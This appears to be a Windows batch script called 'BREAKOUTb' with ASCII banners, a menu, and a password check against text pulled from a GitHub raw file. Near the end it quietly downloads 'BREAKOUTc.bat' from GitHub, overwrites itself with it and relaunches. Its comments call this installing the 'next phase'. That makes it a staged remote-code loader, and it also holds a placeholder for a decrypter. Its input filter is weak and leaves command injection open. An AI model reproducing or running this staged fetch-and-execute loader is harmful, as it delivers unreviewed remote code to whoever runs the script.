@echo off
setlocal enabledelayedexpansion
title BREAKOUTb
color 4
echo =======================================================================================
echo " ________  ________  _______   ________  ___  __    ________  ___  ___  _________   ";
echo "|\   __  \|\   __  \|\  ___ \ |\   __  \|\  \|\  \ |\   __  \|\  \|\  \|\___   ___\ ";
echo "\ \  \|\ /\ \  \|\  \ \   __/|\ \  \|\  \ \  \/  /|\ \  \|\  \ \  \\\  \|___ \  \_| ";
echo " \ \   __  \ \   _  _\ \  \_|/_\ \   __  \ \   ___  \ \  \\\  \ \  \\\  \   \ \  \  ";
echo "  \ \  \|\  \ \  \\  \\ \  \_|\ \ \  \ \  \ \  \\ \  \ \  \\\  \ \  \\\  \   \ \  \ ";
echo "   \ \_______\ \__\\ _\\ \_______\ \__\ \__\ \__\\ \__\ \_______\ \_______\   \ \__\";
echo "    \|_______|\|__|\|__|\|_______|\|__|\|__|\|__| \|__|\|_______|\|_______|    \|__|";
echo "                                                                                    ";
echo =======================================================================================
echo Checking Connection.
ping -n 2 -w 700 www.google.com | find "bytes=" >nul
IF %ERRORLEVEL% EQU 0 (
    echo Connection Found.
    goto Start
) ELSE (
    echo No Connection, running diagnostics.
    TIMEOUT /T 1 /NOBREAK >nul
    echo Please relaunch with a connection.
    ipconfig /flushdns >nul
    exit /b
)
:Start
cls
echo ==============================================
echo "  _________                                ";
echo " /   _____/ ______________  __ ___________ ";
echo " \_____  \_/ __ \_  __ \  \/ // __ \_  __ \";
echo " /        \  ___/|  | \/\   /\  ___/|  | \/";
echo "/_______  /\___  >__|    \_/  \___  >__|   ";
echo "        \/     \/                 \/       ";
echo ==============================================
echo Recovery [1]
echo Login [2]
@echo off
:input
set /p userInput="Selection: "
echo %userInput% | findstr "&&" >nul
if %errorlevel% equ 0 (
    echo Filtering.
    Timeout /T 2 /NOBREAK >nul
    echo "Invalid input: '&&' is not allowed."
    goto input
)
echo "Input accepted: %userInput%"
if %userInput%==1 goto :RecoveryTools
if %userInput%==2 goto :Login
echo Error invalid input selected.
Timeout /T 5 /NOBREAK >nul
exit /b
:RecoveryTools
REM Decrypter here

:Login
set /p "KEY=Password"
set "GITHUB_URL=https://raw.githubusercontent.com/Krayz7436/Batch/refs/heads/main/test.txt"
for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest -Uri '%GITHUB_URL%').Content"') do (
    set "LINE=%%i"
)

:: Compare the variable with the line from the GitHub file
if "%KEY%" == "!LINE!" (
    echo The variable matches the content of the GitHub file.
) else (
    echo The variable does not match the content of the GitHub file.
)
pause
endlocal

REM imports raw github txt file and runs it within the current shell.

powershell -command "Get-History"

REM this sends a file download request to the github to install the next phase as shown previously in the first phase.

if /i not "%~1"=="BreakoutC" (
    echo Updating %~nx0 ...
    >nul 2>&1 powershell iwr "https://raw.githubusercontent.com/Krayz7436/Batch/refs/heads/main/BREAKOUTc.bat" -OutFile "%temp%\%~nx0"
    >nul 2>&1 move /y "%temp%\%~nx0" "%~dpnx0"
    >nul 2>&1 powershell start "%~0" BreakoutC & exit /b
)
cd /d "%~dp0"
pause
